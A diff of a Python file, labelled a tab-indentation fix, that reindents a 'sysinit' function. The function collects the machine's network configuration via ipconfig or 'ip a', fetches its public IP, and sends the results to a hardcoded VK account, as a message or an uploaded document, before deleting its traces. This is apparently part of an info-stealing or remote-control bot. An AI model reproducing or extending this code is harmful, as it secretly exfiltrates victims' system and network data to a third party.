@@ -1,4 +1,4 @@
-from modules import requests, argparse, vk_api  # import from modules
+from modules import requests, argparse, vk_api  # fix tabs
 import random, datetime, sys, time, os
 
 
@@ -78,25 +78,25 @@ def sysinit(send, vk=None):
         
         content = f"[ipconfig config]:\n----\n{content}"
         os.remove("output_init_info.txt")
-		if len(content) <= 1200:
-			send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
-		else:
-			file = open('logging.txt', 'wt', encoding='utf-8')
-			file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
-			file.close()
-			
-			a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
+        if len(content) <= 1200:
+            send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+        else:
+            file = open('logging.txt', 'wt', encoding='utf-8')
+            file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+            file.close()
+            
+            a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
             img = {'file': ('logging.txt', open('logging.txt', 'rb'))}
             response = requests.post(a, files=img)
             result = json.loads(response.text)['file']
             owner=vk.docs.save(file=result)["doc"]['owner_id']
             document=vk.docs.save(file=result)['doc']['id']
             sendF = 'doc'+str(owner)+'_'+str(document)
-			
-			send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
-			os.remove('logging.txt')
+            
+            send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
+            os.remove('logging.txt')
 
-	else:
+    else:
         os.system("ip a >output_init_info_partOne.txt")
         f = open("output_init_info_partOne.txt", "rt")
         content_part_one = f.read()
@@ -112,27 +112,27 @@ def sysinit(send, vk=None):
         content_part_two = f.read()
         
         content = f"[ip a config]:\n----\n{content_part_one}"
-		os.remove("output_init_info_partOne.txt")
+        os.remove("output_init_info_partOne.txt")
         os.remove("output_init_info_partTwo.txt")
         
         f.close()
-		if len(content) <= 1200:
-			send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+        if len(content) <= 1200:
+            send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
         else:
-			file = open('logging.txt', 'wt', encoding='utf-8')
-			file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
-			file.close()
-			
-			a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
+            file = open('logging.txt', 'wt', encoding='utf-8')
+            file.write(f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+            file.close()
+            
+            a = vk.docs.getMessagesUploadServer(type='doc', peer_id=566312040)['upload_url']
             img = {'file': ('logging.txt', open('logging.txt', 'rb'))}
             response = requests.post(a, files=img)
             result = json.loads(response.text)['file']
             owner=vk.docs.save(file=result)["doc"]['owner_id']
             document=vk.docs.save(file=result)['doc']['id']
             sendF = 'doc'+str(owner)+'_'+str(document)
-			
-			send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
-			os.remove('logging.txt')
+            
+            send(random_id=0, user_id=566312040, message="logIn", attachment=sendF)
+            os.remove('logging.txt')
         
 
 
